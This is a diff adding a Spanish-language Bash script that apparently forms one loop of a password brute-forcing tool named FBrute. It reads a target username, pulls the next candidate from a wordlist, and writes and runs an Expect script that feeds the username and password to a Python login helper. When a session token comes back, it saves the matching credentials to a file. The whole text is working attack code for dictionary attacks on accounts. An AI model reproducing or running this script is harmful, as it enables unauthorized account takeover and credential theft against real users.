@@ -1,0 +1,71 @@
+
+# Variables de usr
+
+usr=$(cat .usr)
+
+# Inicio de diccionario
+
+valor=p
+
+leer=$(cat .nm)
+
+suma=$(expr $leer + 1 |& tee .nm)
+
+line=$(sed -n $suma$valor Pass.txt)
+
+save=$(echo "$line" > .pass)
+
+# Fin de diccionario
+
+# Programa test
+
+bash .banner
+echo -e "\e[38;5;196m"
+echo "Probando contraseña $suma"
+echo ""
+echo "Usuario: $usr"
+echo "Contraseña: $line"
+echo ""
+
+# Generando Expect
+
+jsks=$(rm -fr cookie)
+jdjd=$(rm -fr .base)
+echo "#!/usr/bin/expect -f" >> .base
+echo "spawn python2 .fbo" >> .base
+echo "expect %Hak9 >>%" >> .base
+echo "send -- %token\n%" >> .base
+echo "expect %Username:%" >> .base
+echo "send -- %$usr\n%" >> .base
+echo "expect %Password:%" >> .base
+echo "send -- %$line\n%" >> .base
+echo "expect eof" >> .base
+sed 's/%/"/g' .base > .org
+var=$(chmod 777 .org; ./.org)
+
+auth=$(cat cookie/token.log)
+
+if [ "$line" = "" ]; then
+bash .lector
+fi
+
+if [ "$auth" = "" ]; then
+rm -fr cookies
+bash .vc
+else
+bash .banner
+echo -e "\e[38;5;46m"
+echo "Credenciales que coinciden:"
+echo ""
+echo "Usuario: $usr"
+echo "Contraseña: $line"
+echo ""
+echo "Presiona una tecla para continuar..."
+read pause
+ol=$(echo "Usuario: $usr Contraseña: $line" >> Credenciales.txt)
+bash FBrute.sh
+fi
+
+if [ "$usr" = "" ]; then
+exit
+fi
